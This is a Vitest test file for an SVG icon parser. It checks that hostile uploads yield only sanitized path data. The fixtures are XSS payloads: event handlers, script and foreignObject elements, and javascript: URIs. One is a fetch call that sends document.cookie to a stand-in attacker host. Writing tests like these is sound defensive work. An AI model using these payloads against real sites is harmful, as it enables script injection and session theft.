/**
 * shieldcn
 * src/badges/svg-parser.test
 *
 * parseSvg() is an allowlist extractor — it only ever pulls specific named
 * attributes off specific known elements (path d=, circle cx/cy/r, rect
 * x/y/width/height, etc.) via targeted regexes, then re-synthesizes new path
 * data from validated numbers. It never copies an element or its full
 * attribute set through verbatim. These tests lock in that a maliciously
 * crafted upload (event handlers, <script>, <foreignObject>, embedded quotes
 * attempting an attribute-breakout) can never leak into the extracted icon
 * data, regardless of how the renderer later serializes it.
 */

import { describe, it, expect } from "vitest"
import { parseSvg, decodeSvgDataUri } from "./svg-parser"

function serialized(parsed: ReturnType<typeof parseSvg>): string {
  if (!parsed) return ""
  return JSON.stringify(parsed)
}

describe("parseSvg — adversarial input", () => {
  it("never extracts an onload/onclick/on* handler from a <path>", () => {
    const svg = `<svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" onload="alert(1)" onclick="fetch('https://evil.example/'+document.cookie)"/></svg>`
    const out = serialized(parseSvg(svg))
    expect(out).not.toMatch(/onload|onclick|alert\(|fetch\(/i)
  })

  it("never extracts a <script> element's contents", () => {
    const svg = `<svg viewBox="0 0 24 24"><path d="M1 1L2 2"/><script>alert(document.cookie)</script></svg>`
    const out = serialized(parseSvg(svg))
    expect(out).not.toMatch(/script|alert|cookie/i)
  })

  it("never extracts href/xlink:href (e.g. javascript: URIs)", () => {
    const svg = `<svg viewBox="0 0 24 24"><a href="javascript:alert(1)"><path d="M1 1L2 2"/></a></svg>`
    const out = serialized(parseSvg(svg))
    expect(out).not.toMatch(/javascript:|href/i)
  })

  it("never extracts a <foreignObject> (HTML/script smuggling vector in SVG)", () => {
    const svg = `<svg viewBox="0 0 24 24"><path d="M1 1L2 2"/><foreignObject><body onload="alert(1)"><script>alert(1)</script></body></foreignObject></svg>`
    const out = serialized(parseSvg(svg))
    expect(out).not.toMatch(/foreignObject|onload|script/i)
  })

  it("never extracts style attributes or embedded CSS (e.g. url(javascript:...))", () => {
    const svg = `<svg viewBox="0 0 24 24"><path d="M1 1L2 2" style="fill:url(javascript:alert(1))"/></svg>`
    const out = serialized(parseSvg(svg))
    expect(out).not.toMatch(/style|url\(javascript/i)
  })

  it("a path 'd' value containing a literal quote cannot smuggle a trailing attribute", () => {
    // If a naive parser treated this as raw markup, the embedded `"` would
    // close the d="..." attribute early and `onload="alert(1)"` would become
    // a real attribute on the <path> tag. Our regex-based extraction reads
    // only up to the first quote, so `onload` is simply inert trailing text
    // within the matched tag and is never read.
    const svg = `<svg viewBox="0 0 24 24"><path d="M0 0" onload="alert(1)"/></svg>`
    const parsed = parseSvg(svg)
    expect(parsed?.icon.path).toBe("M0 0")
    expect(serialized(parsed)).not.toMatch(/onload/i)
  })

  it("rejects a shape whose attribute has no leading number at all", () => {
    // cx/cy/r are parsed with parseFloat; a value with no leading digits
    // yields NaN and the shape is dropped entirely.
    const svg = `<svg viewBox="0 0 24 24"><circle cx="not-a-number" cy="5" r="5"/></svg>`
    const parsed = parseSvg(svg)
    expect(parsed).toBeNull()
  })

  it("a shape attribute with a numeric prefix uses only the number — attacker suffix text never reaches path data", () => {
    // parseFloat("1) console.log(...)") reads the leading "1" and stops at
    // the first non-numeric character (standard JS parseFloat behavior) — so
    // even a not-fully-numeric attribute can't smuggle arbitrary text into
    // the synthesized path, it just contributes a (safe, coerced) number.
    const svg = `<svg viewBox="0 0 24 24"><circle cx="1) console.log(document.cookie); (" cy="5" r="5"/></svg>`
    const parsed = parseSvg(svg)
    expect(parsed?.icon.path).not.toMatch(/console|cookie|document/i)
  })

  it("extracted viewBox cannot contain a quote character (so it can't break out of the output attribute)", () => {
    const svg = `<svg viewBox="0 0 24 24"><path d="M1 1L2 2"/></svg>`
    const parsed = parseSvg(svg)
    expect(parsed?.icon.viewBox).not.toContain('"')
    expect(parsed?.icon.viewBox).not.toContain("'")
  })

  it("only known shape elements contribute path data — an unknown element with a d-like attribute is ignored", () => {
    const svg = `<svg viewBox="0 0 24 24"><evil-element d="M99 99L100 100"/><path d="M1 1L2 2"/></svg>`
    const parsed = parseSvg(svg)
    expect(parsed?.icon.path).toBe("M1 1L2 2")
  })
})

describe("parseSvg — normal shapes still work", () => {
  it("extracts a simple path", () => {
    const parsed = parseSvg(`<svg viewBox="0 0 24 24"><path d="M1 1L2 2"/></svg>`)
    expect(parsed?.icon.path).toBe("M1 1L2 2")
  })

  it("converts a circle to an arc path", () => {
    const parsed = parseSvg(`<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/></svg>`)
    expect(parsed?.icon.path).toContain("a5,5")
  })

  it("converts a rect to a path", () => {
    const parsed = parseSvg(`<svg viewBox="0 0 24 24"><rect x="2" y="2" width="10" height="10"/></svg>`)
    expect(parsed?.icon.path).toBe("M2,2h10v10h-10z")
  })

  it("detects stroke-based icons", () => {
    const parsed = parseSvg(
      `<svg viewBox="0 0 24 24"><path d="M1 1L2 2" fill="none" stroke="currentColor" stroke-width="2"/></svg>`,
    )
    expect(parsed?.isStroke).toBe(true)
    expect(parsed?.icon.strokeWidth).toBe(2)
  })

  it("returns null when no renderable shapes are present", () => {
    expect(parseSvg(`<svg viewBox="0 0 24 24"><text>hi</text></svg>`)).toBeNull()
  })
})

describe("decodeSvgDataUri", () => {
  it("decodes a base64 data URI", () => {
    const svg = `<svg viewBox="0 0 24 24"><path d="M1 1L2 2"/></svg>`
    const uri = `data:image/svg+xml;base64,${Buffer.from(svg).toString("base64")}`
    expect(decodeSvgDataUri(uri)).toBe(svg)
  })

  it("decodes a percent-encoded UTF-8 data URI", () => {
    const uri = `data:image/svg+xml,${encodeURIComponent('<svg viewBox="0 0 24 24"><path d="M1 1L2 2"/></svg>')}`
    expect(decodeSvgDataUri(uri)).toBe('<svg viewBox="0 0 24 24"><path d="M1 1L2 2"/></svg>')
  })

  it("returns null for a non-SVG data URI", () => {
    expect(decodeSvgDataUri("data:image/png;base64,abc123")).toBeNull()
  })

  it("returns null for malformed base64", () => {
    // Buffer.from with invalid base64 doesn't throw in Node, but confirms no crash either way.
    expect(() => decodeSvgDataUri("data:image/svg+xml;base64,%%%not-base64%%%")).not.toThrow()
  })
})
